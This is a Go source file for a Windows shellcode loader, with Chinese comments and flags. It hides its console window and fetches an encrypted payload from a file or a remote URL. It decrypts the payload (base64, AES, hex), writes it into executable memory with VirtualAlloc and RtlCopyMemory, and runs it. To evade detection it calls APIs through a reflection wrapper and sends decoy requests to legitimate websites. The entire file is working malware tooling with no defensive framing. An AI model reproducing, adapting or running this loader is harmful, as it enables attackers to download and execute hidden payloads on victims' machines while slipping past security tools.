package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"github.com/asmcos/requests"
	"github.com/lxn/win"
	"github.com/spf13/pflag"
	"io/ioutil"
	"math/rand"
	"os"
	"reflect"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"
)
const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)


var (
	jiazai *syscall.DLL
	jiadll *syscall.DLL
	changshi *syscall.Proc
	jiashell *syscall.Proc
	sh12huelluu []byte
	head = requests.Header{
		"Cache-Control": "max-age=0",
		"Sec-Ch-Ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"",
		"Sec-Ch-Ua-Mobile": "?0",
		"Sec-Ch-Ua-Platform": "\"macOS\"",
		"Upgrade-Insecure-Requests": "1",
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"Sec-Fetch-Site": "none",
		"Sec-Fetch-Mode": "navigate",
		"Sec-Fetch-User": "?1",
		"Sec-Fetch-Dest": "document",
		"Accept-Encoding": "gzip, deflate",
		"Accept-Language": "zh-CN,zh;q=0.9",
		"Connection": "close"}
	url = map[string]string{
		"url1" : "https://forum.butian.net",
		"url2" : "https://passport.safedog.cn/login.html",
		"url3" : "http://sso.wanda.cn/LoginLight.aspx",
		"url4" : "http://www.ip3366.net/",
		"url5" : "https://zb.oschina.net/activity/world-cup/index.html",
		"url6" : "https://www.cnblogs.com/",
		"url7" : "https://www.cnvd.org.cn/"}
)
func main() {
	win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)
	urll := ""
	filee := ""
	pflag.StringVarP(&urll, "url", "u", "", "设置加密后的payload链接")
	pflag.StringVarP(&filee, "file", "f", "", "设置加密后的payload文件")
	pflag.Parse()
	fmt.Println(urll)
	fmt.Println(filee)

	//if len(os.Args) > 1 {
	if filee != "" {
		nr, err := ioutil.ReadFile(filee)
		goerr(err)
		sh12huelluu = str_func(jiemi, string(nr))[0].Bytes()
		go garb()
		import_dll()
		addr, _, err := changshi.Call(0, uintptr(len(sh12huelluu)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
		if addr == 0 {
			goerr(err)
		}
		str_func(jiashell.Call, addr, (uintptr)(unsafe.Pointer(&sh12huelluu[0])), uintptr(len(sh12huelluu)))
		go garb()
		syscall.Syscall(addr, 0, 0, 0, 0)
		go garb()
	} else if urll != ""{
		url["url"] = urll
		go garb()
		code := Get_Code()
		if code != "False" {
			sh12huelluu = str_func(jiemi, code)[0].Bytes()
			addr, _, err := changshi.Call(0, uintptr(len(sh12huelluu)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
			if addr == 0 {
				goerr(err)
			}

			str_func(jiashell.Call, addr, (uintptr)(unsafe.Pointer(&sh12huelluu[0])), uintptr(len(sh12huelluu)))
			go garb()
			syscall.Syscall(addr, 0, 0, 0, 0)
			go garb()
		}else {
			go garb()
		}
	}
	go garb()

}


func goerr(err error) {
	if err != nil {
		if err.Error() == "The operation completed successfully." {

		}else {
			println(err.Error())
			os.Exit(1)
		}
	}
}

func unpadding(src []byte) []byte {
	n := len(src)
	unpadnum := int(src[n-1])
	return src[:n-unpadnum]
}

func decryptAES(src []byte, key []byte) []byte {
	block, _ := aes.NewCipher(key)
	blockmode := cipher.NewCBCDecrypter(block, key)
	blockmode.CryptBlocks(src, src)
	src = unpadding(src)
	return src
}

func Get_Aes_decode(str string, keys string) string {
	x := []byte(str)
	key := []byte(keys)
	x1 := decryptAES(x, key)
	return string(x1)
}

func jiemi(str string) []byte {
	decodeBytes, err := base64.StdEncoding.DecodeString(str)
	go garb()
	goerr(err)
	key := string(decodeBytes)[0:16]
	go garb()
	a := Get_Aes_decode(strings.Replace(string(decodeBytes), key, "", 1), key)

	decodeBytes1, err := base64.StdEncoding.DecodeString(a)
	go garb()
	goerr(err)
	decode, err := hex.DecodeString(string(decodeBytes1))
	goerr(err)
	return decode
}

func Get_Code() string {
	qingqiu := requests.Requests()

	rand.Seed(time.Now().Unix())
	n := rand.Intn(7) + 1
	for i:=1;i<=n;i++{
		jian := "url"+strconv.Itoa(i)
		qingqiu.Get(url[jian],head)
	}
	_,err1 := url["url"]
	if !err1{
		return "False"
	}
	xy, err := qingqiu.Get(url["url"], head)

	if err != nil {
		os.Exit(0)
	}else {
		import_dll()
		return xy.Text()
	}
	return "False"
}

func import_dll(){
	jiazai      = str_func(syscall.MustLoadDLL,"kernel32.dll")[0].Interface().(*syscall.DLL)
	jiadll      = str_func(syscall.MustLoadDLL,"ntdll.dll")[0].Interface().(*syscall.DLL)
	changshi    = str_func(jiazai.MustFindProc,"VirtualAlloc")[0].Interface().(*syscall.Proc)
	jiashell    = str_func(jiadll.MustFindProc,"RtlCopyMemory")[0].Interface().(*syscall.Proc)
}


func str_func(hanshu interface{}, canshu ...interface{}) []reflect.Value {
	//将函数包装为反射值对象
	funcValue := reflect.ValueOf(hanshu)
	//构造函数参数
	paramList := []reflect.Value{}
	for i := 0; i < len(canshu); i++ {
		paramList = append(paramList, reflect.ValueOf(canshu[i]))
	}
	//调用函数
	jieguo := funcValue.Call(paramList)
	//返回结果
	return jieguo
}

func garb()  {
	shijian := time.Now()
	shijian.Year()
	shijian.Month()
	shijian.Day()
	shijian.Hour()
	shijian.Minute()
	shijian.Second()
	chuo, _ := strconv.Atoi(strconv.Itoa(int(shijian.UnixNano()))[12:16])
	time.Sleep(time.Microsecond * time.Duration(chuo))
	qingqiu := requests.Requests()
	rand.Seed(time.Now().Unix())
	n := rand.Intn(7) + 1
	jian := "url"+strconv.Itoa(n)
	qingqiu.Get(url[jian],head)
}